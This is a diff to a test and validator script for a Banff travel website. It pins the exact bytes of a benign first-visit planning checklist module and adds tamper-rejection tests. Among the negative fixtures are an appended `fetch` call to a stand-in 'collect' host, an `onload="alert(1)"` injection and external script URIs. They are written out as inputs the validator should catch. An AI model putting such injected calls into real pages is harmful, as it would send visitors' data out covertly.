@@ -18,6 +18,10 @@ import { ORIGIN, ROOT, normal, htmlFacts, htmlElements, textInside, schemaNodes,
 // --built-dir <directory> reads emitted HTML/sitemaps/photos and a stable local
 // build receipt; it does not assert deployed identity, HTTP status or redirects.
 const EXPECTED_ROUTES = 255;
+// Astro inlined this reviewed processed component in the clean 5f69ca8 build.
+// Pin its exact bytes, not a general inline or same-origin script exception.
+const FIRST_VISIT_PROCESSED_SHA256 = "23f8f15ae29817e9d9563e542543218fdc1a63ab382a8148206c69290d1d6c38";
+const FIRST_VISIT_PROCESSED_MODULE = "const c=[{id:\"arrival\",title:\"Join the arrival and return\",task:\"Work from your actual flight, accommodation entrance and final airport arrival. Join the outward and return legs, including luggage and any local connection.\",links:[{href:\"/calgary-to-banff/\",label:\"Plan the airport journey\"},{href:\"/car-free-banff/\",label:\"Compare car-free connections\"}]},{id:\"base\",title:\"Choose a base and room\",task:\"Compare the overnight location, room layout and facilities you will actually book. Include the journey from that address to each main departure point.\",links:[{href:\"/towns/\",label:\"Compare mountain bases\"},{href:\"/book/banff-hotels/\",label:\"Compare Banff room choices\"},{href:\"/book/lake-louise-stays/\",label:\"Compare Lake Louise stays\"},{href:\"/blog/banff-hostel-guide/\",label:\"Consider a hostel stay\"}]},{id:\"days\",title:\"Give each day a main outing\",task:\"Start with one main objective and room for the whole journey. Choose the actual route, resort or activity that fits your group, and keep a different kind of day available.\",links:[{href:\"/trip-builder/\",label:\"Shape an editable itinerary\"},{href:\"/ski-day-planner/\",label:\"Build a resort day\"},{href:\"/learn-to-ski/\",label:\"Plan a first lesson\"}]},{id:\"access\",title:\"Join access, transport and admission\",task:\"Separate park admission from destination transport, parking and activity tickets. Confirm the actual dates, departure point, check-in and last useful return for the outing you chose.\",links:[{href:\"/park-pass/\",label:\"Work through admission\"},{href:\"/shuttle-reservations/\",label:\"Plan lake access and returns\"},{href:\"/parking/\",label:\"Check destination parking\"}]},{id:\"quotes\",title:\"Compare quotes and confirmations\",task:\"Use the same people, dates, room nights and booking terms. Keep missing costs unknown, count confirmed inclusions once, and keep the cancellation terms with each dependent booking.\",links:[{href:\"/trip-cost/\",label:\"Compare your actual quotes\"},{href:\"/blog/where-to-stay-in-banff/\",label:\"Join the stay and journey\"}]},{id:\"backup\",title:\"Prepare the offline and weather backup\",task:\"Have the maps, tickets, contacts and equipment you need before leaving connectivity. Review current sources and agree on a different outing if weather, access or the group changes the plan.\",links:[{href:\"/blog/banff-mobile-connectivity/\",label:\"Prepare for connectivity gaps\"},{href:\"/packing-list/\",label:\"Build a packing checklist\"},{href:\"/blog/rainy-day-banff/\",label:\"Choose a weather alternative\"},{href:\"/conditions/\",label:\"Find current source reports\"}]}],f=new Set(c.map(a=>a.id));function h(a=[]){const i=new Set(Array.isArray(a)?a.filter(e=>typeof e==\"string\"&&f.has(e)):[]),s=c.filter(e=>i.has(e.id)).map(e=>e.id),o=c.filter(e=>!i.has(e.id)).map(e=>e.id),r=c.find(e=>!i.has(e.id));return{checkedIds:s,remainingIds:o,checkedCount:s.length,total:c.length,nextId:r?.id??null,summary:`${s.length} of ${c.length} planning steps marked`,detail:r?`Next question: ${r.title.toLowerCase()}.`:\"All six steps are marked. Recheck your actual confirmations and the latest sources before departure.\",nextHref:r?`#first-visit-${r.id}`:null}}const n=document.getElementById(\"first-visit-planner\");if(n){const a=[...n.querySelectorAll(\"[data-first-visit-check]\")],i=n.querySelector(\"#first-visit-status\"),s=n.querySelector(\"#first-visit-next\"),o=n.querySelector(\"#first-visit-next-link\"),r=n.querySelector(\"#first-visit-clear\"),e=n.querySelector(\"#first-visit-progress\");if(a.length===6&&i&&s&&o&&r&&e){const d=()=>{const t=h(a.filter(l=>l.checked).map(l=>l.value));i.textContent=t.summary,s.textContent=t.detail,o.hidden=t.nextHref===null,t.nextHref?o.setAttribute(\"href\",t.nextHref):o.removeAttribute(\"href\");for(const l of n.querySelectorAll(\"[data-first-visit-step]\"))l.dataset.marked=String(t.checkedIds.includes(l.dataset.firstVisitStep))};for(const t of a)t.checked=!1,t.addEventListener(\"change\",d);r.addEventListener(\"click\",()=>{for(const t of a)t.checked=!1;d()}),d();for(const t of n.querySelectorAll(\"[data-first-visit-check-wrap]\"))t.hidden=!1;e.hidden=!1}}";
 const PARTIAL_LABEL = 'Opening paragraph repaired (full guide review pending):';
 const ORIGINAL_PUBLICATION = {
   'nightclub-banff':'2026-03-31', 'banff-nightclubs':'2026-04-08', 'new-places-to-eat-in-banff':'2026-04-03',
@@ -132,6 +136,18 @@ function firstVisitComponentScope(html,elements,authored,expected,errors){
   if(new Set(ids).size!==ids.length||ids.length!==expectedIds.length||expectedIds.some(id=>!ids.includes(id))||anchors.length!==expected.steps.flatMap(step=>step.links).length+1||buttons.length!==1||buttons[0]!==clear||!nodes.some(n=>n.tag==='noscript'))errors.push('first-visit exact controls/no-JS structure differs');
   if(nodes.some(n=>['form','select','textarea','iframe','object','embed','script','img','link','video','audio','source'].includes(n.tag)||Object.keys(n.attributes).some(key=>/^on/.test(key)||['src','srcset','action','formaction'].includes(key)))||/\b(?:ready|safety) score|guaranteed safe/i.test(textInside(html,section)))errors.push('Unexpected first-visit personal/provider/score markup');
   return errors.length===before?section:null;
+}
+function firstVisitProcessedScriptScope(html,elements,authored,component,errors){
+  const modules=elements.filter(n=>n.tag==='script'&&inside(n,authored)&&n.attributes.type!=='application/ld+json');
+  if(!component||modules.length!==1){errors.push('Missing/duplicate first-visit processed module');return null;}
+  const script=modules[0],attributes=Object.keys(script.attributes),content=html.slice(script.openEnd,script.innerEnd);
+  if(attributes.length!==1||attributes[0]!=='type'||script.attributes.type!=='module'||content!==FIRST_VISIT_PROCESSED_MODULE||createHash('sha256').update(content).digest('hex')!==FIRST_VISIT_PROCESSED_SHA256){errors.push('Incorrect first-visit processed module bytes or attributes');return null;}
+  // This component is the final authored element. Its processed program is an
+  // immediate following sibling, before the independently validated layout tail.
+  if(script.start<component.end||html.slice(component.end,script.start).trim()||html.slice(script.end,authored.innerEnd).trim()){
+    errors.push('Incorrect first-visit processed module adjacency');return null;
+  }
+  return script;
 }
 const fullMarkers = {
   'num-ti-jah-lodge': {water:'paddling, large inflatables and motorized boating as prohibited',zone:'Water Preservation Zone',connectivity:'no telephones, TVs or Wi-Fi',season:'Chalet accommodation from winter 2027'},
@@ -416,7 +432,7 @@ export async function loadGuideInventory() {
   assert.equal((blogPage.match(/<FirstVisitPlanningInteractions\s*\/>/g)??[]).length,1,'One actual component insertion');assert.ok(blogPage.includes("post.slug === 'banff-first-time-tips' && <FirstVisitPlanningInteractions />"),'Component is restricted to the reviewed first-visit slug');
   for(const check of additions.filter(c=>c.quality.journeyGuide)){
     const post=d.allBlogPosts.find(p=>p.slug===check.quality.slug);
-    check.quality.ssrHtml=await plannerSourceHtml('src/layouts/BlogLayout.astro',{request:new Request(ORIGIN+check.path+'?email=PRIVATE_FIXTURE&gclid=PRIVATE_CLICK'),props:{...post,curatedBookingLinks:true},slots:{default:check.quality.bodyHtml+(check.quality.firstVisit?firstVisitHtml:'')}});
+    check.quality.ssrHtml=await plannerSourceHtml('src/layouts/BlogLayout.astro',{request:new Request(ORIGIN+check.path+'?email=PRIVATE_FIXTURE&gclid=PRIVATE_CLICK'),props:{...post,curatedBookingLinks:true},slots:{default:check.quality.bodyHtml+(check.quality.firstVisit?firstVisitHtml+`<script type="module">${FIRST_VISIT_PROCESSED_MODULE}</script>`:'')}});
     assert.ok(!/PRIVATE_FIXTURE|PRIVATE_CLICK/.test(check.quality.ssrHtml),'Reader query is not forwarded into the article or shared booking fallbacks.');
   }
   const contextPost=d.allBlogPosts.find(p=>p.slug==='jasper-alberta');assert.ok(contextPost&&!d.blogRedirects[contextPost.slug]);
@@ -600,6 +616,7 @@ export function analyseGuideHtml(html,check,sitemap,headerRobots='') {
       if(q.journeyGuide){
         const body=authored,bodyElements=elements.filter(n=>inside(n,body)),tables=bodyElements.filter(n=>n.tag==='table');
         const firstComponent=q.firstVisit?firstVisitComponentScope(html,elements,authored,q.firstVisit,errors):null;
+        const processedScript=q.firstVisit?firstVisitProcessedScriptScope(html,elements,authored,firstComponent,errors):null;
         if(!q.firstVisit&&byId('first-visit-planner').length)errors.push('Unexpected first-visit component on another guide');
         const guarded=bodyElements.filter(n=>!firstComponent||!inside(n,firstComponent));
         const expectedRows={'7-day-banff-itinerary':[8],'rainy-day-banff':[6],'lake-louise-village-guide':[5,5],'canmore-day-trip':[5],'banff-car-rental-tips':[4,4],'where-to-stay-in-banff':[7,6],'banff-hostel-guide':[6],'banff-first-time-tips':[4],'banff-mobile-connectivity':[4,5],'kananaskis-day-trip':[6,5]}[q.slug];
@@ -610,7 +627,7 @@ export function analyseGuideHtml(html,check,sitemap,headerRobots='') {
         const ids=bodyElements.map(n=>n.attributes.id).filter(Boolean);
         if(new Set(ids).size!==ids.length||anchors.some(n=>n.attributes.href?.startsWith('#')&&!ids.includes(n.attributes.href.slice(1))))errors.push('Broken/duplicate journey guide section anchors');
         if(guarded.some(n=>['form','input','iframe','object','embed'].includes(n.tag)||Object.keys(n.attributes).some(key=>/^on/.test(key))))errors.push('Unexpected active/personal-data journey guide markup');
-        const scripts=guarded.filter(n=>n.tag==='script');if(scripts.length!==1||scripts[0].attributes.type!=='application/ld+json'||Object.hasOwn(scripts[0].attributes,'src'))errors.push('Unexpected journey client/provider script');
+        const scripts=guarded.filter(n=>n.tag==='script'&&n!==processedScript);if(scripts.length!==1||scripts[0].attributes.type!=='application/ld+json'||Object.hasOwn(scripts[0].attributes,'src'))errors.push('Unexpected journey client/provider script');
         for(const action of q.nativeActionLinks??[]){const found=anchors.filter(n=>n.attributes.href===action.href);if(found.length!==1||found[0].hidden||textInside(html,found[0])!==action.label)errors.push('Incorrect fixed native emergency action: '+action.href);}
         const externals=anchors.filter(n=>!n.attributes.href.startsWith('/')&&!n.attributes.href.startsWith('#'));
         for(const a of externals){const href=a.attributes.href,action=q.nativeActionLinks?.find(n=>n.href===href),referral=q.nativeReferrals.includes(href),rel=(a.attributes.rel??'').split(/\s+/);if(action){if(textInside(html,a)!==action.label||rel.includes('sponsored'))errors.push('Incorrect journey official/referral destination or purpose');continue;}if(![...q.journeySources,...q.nativeReferrals].includes(href)||!href.startsWith('https://')||a.attributes.target!=='_blank'||!rel.includes('noopener')||rel.includes('sponsored')!==referral)errors.push('Incorrect journey official/referral destination or purpose');}
@@ -930,7 +947,8 @@ function fixture(check){
 }
 export async function selfTest(){
   await foundationSelfTest();const inventory=await loadGuideInventory();
-  let journeyNegatives=0,tripBuilderNegatives=0,firstVisitNegatives=0;
+  let journeyNegatives=0,tripBuilderNegatives=0,firstVisitNegatives=0,firstVisitScriptNegatives=0;
+  assert.equal(FIRST_VISIT_PROCESSED_MODULE.length,4058);assert.equal(createHash('sha256').update(FIRST_VISIT_PROCESSED_MODULE).digest('hex'),FIRST_VISIT_PROCESSED_SHA256,'Emitted fixture retains the reviewed program bytes');
   const supplements=inventory.checks.filter(c=>c.quality);assert.equal(supplements.length,62);
   for(const check of supplements){const html=fixture(check),sitemap=new Set([ORIGIN+check.path]);assert.deepEqual(analyseGuideHtml(html,check,sitemap).errors,[],check.path+': complete supplement fixture');
     assert.ok(analyseGuideHtml(html.replace('rel="canonical"','rel="alternate"'),check,sitemap).errors.length,check.path+': canonical negative');
@@ -1033,6 +1051,22 @@ export async function selfTest(){
           const fake='<section id="first-visit-planner"><input type="text" name="phone"></section>';
           componentReject(html.slice(0,component.start)+fake+html.slice(component.end),'A matching section ID alone grants no exemption');
           assert.ok(inputTag.includes('data-first-visit-check'),'Mutations exercised the actual component output');
+          const module=all.find(n=>n.tag==='script'&&n.attributes.type==='module'&&inside(n,body)),program=html.slice(module.start,module.end),programText=html.slice(module.openEnd,module.innerEnd),without=html.slice(0,module.start)+html.slice(module.end);
+          const scriptReject=(changed,label)=>{reject(changed,label,'first-visit processed module');firstVisitScriptNegatives++;};
+          assert.equal(programText,FIRST_VISIT_PROCESSED_MODULE);assert.deepEqual(module.attributes,{type:'module'});assert.equal(html.slice(component.end,module.start).trim(),'');
+          scriptReject(without,'A missing processed program is not production-complete');
+          scriptReject(html.slice(0,module.end)+program+html.slice(module.end),'Duplicate exact programs are rejected');
+          scriptReject(without.slice(0,component.start)+program+without.slice(component.start),'Even the exact program cannot precede the component');
+          scriptReject(html.slice(0,component.end)+'<p>Unrelated content</p>'+html.slice(component.end),'The program must immediately follow the exact component');
+          scriptReject(html.slice(0,module.openEnd)+programText+';fetch("https://example.invalid/collect")'+html.slice(module.innerEnd),'Appended inline payload changes the reviewed bytes');
+          scriptReject(html.slice(0,module.openEnd)+html.slice(module.innerEnd),'An empty inline module is not the processed program');
+          scriptReject(mutateOpen(module,'type="module"','type="text/javascript"'),'Classic-script type cannot use the module exception');
+          for(const attr of ['onload="alert(1)"','async','data-reader="location"'])scriptReject(mutateOpen(module,'<script','<script '+attr),'Only the observed type attribute is permitted: '+attr);
+          for(const uri of ['/_astro/FirstVisitPlanningInteractions.astro_astro_type_script_index_0_lang.abcdefgh.js','/_astro/OtherComponent.abcdefgh.js','https://example.invalid/widget.js']){
+            scriptReject(html.slice(0,module.start)+`<script type="module" src="${uri}"></script>`+html.slice(module.end),'No unobserved asset URI, including a plausible owned namespace, is permitted: '+uri);
+          }
+          const other=inventory.checks.find(c=>c.quality?.slug==='where-to-stay-in-banff'),otherHtml=fixture(other),otherSitemap=new Set([ORIGIN+other.path]);
+          assert.ok(analyseGuideHtml(otherHtml.replace(/class="article-body(?: [^"]*)?"[^>]*>/,tag=>tag+program),other,otherSitemap).errors.some(e=>e.includes('Unexpected journey client/provider script')),'The exact program is not an inline-script allowance on another guide');
         }
       }
       if(check.quality.slug.startsWith('num'))assert.ok(analyseGuideHtml(html.replaceAll('as prohibited','as permitted'),check,sitemap).errors.length,'Bow Lake permission reversal must fail.');
@@ -1230,8 +1264,8 @@ export async function selfTest(){
   assert.equal(stdout,'','Import must not run either CLI/self-test');assert.equal(stderr,'');
   assert.throws(()=>builtLocations('<!DOCTYPE x><urlset><url><loc>https://banffbound.com/</loc></url></urlset>','urlset'));
   assert.throws(()=>builtLocations('<urlset><url><loc>https://example.com/</loc></url></urlset>','urlset'));
-  assert.ok(journeyNegatives>=200);assert.equal(tripBuilderNegatives,18);assert.equal(firstVisitNegatives,15);
-  console.log(`Guide-quality offline fixtures passed: all250 prior contracts preserved plus5 existing canonical guide contracts =255 unique HTML routes/7photo hashes;88full-review registry,8partial repairs,37authored/39curated contexts. Scoped journey/50FAQ-pair/native-source mutations: ${journeyNegatives} negatives;first-visit actual-component/BlogLayout SSR: ${firstVisitNegatives} component negatives;actual trip-builder SSR/model/default/season/week-template controls: ${tripBuilderNegatives} negatives. Existing planner/photo/alias/source/schema/native-booking/shared-tail spoof checks remain intact.`);
+  assert.ok(journeyNegatives>=200);assert.equal(tripBuilderNegatives,18);assert.equal(firstVisitNegatives,15);assert.equal(firstVisitScriptNegatives,13);
+  console.log(`Guide-quality offline fixtures passed: all250 prior contracts preserved plus5 existing canonical guide contracts =255 unique HTML routes/7photo hashes;88full-review registry,8partial repairs,37authored/39curated contexts. Scoped journey/50FAQ-pair/native-source mutations: ${journeyNegatives} negatives;first-visit actual-component/BlogLayout SSR: ${firstVisitNegatives} component negatives, ${firstVisitScriptNegatives} exact-emitted-module negatives;actual trip-builder SSR/model/default/season/week-template controls: ${tripBuilderNegatives} negatives. Existing planner/photo/alias/source/schema/native-booking/shared-tail spoof checks remain intact.`);
 }
 function builtLocations(xml,kind){
   assert.ok(!/<!DOCTYPE|<!ENTITY/i.test(xml),'Built sitemap cannot declare entities');assert.ok(new RegExp(`<${kind}\\b`).test(xml),'Unexpected built sitemap type');
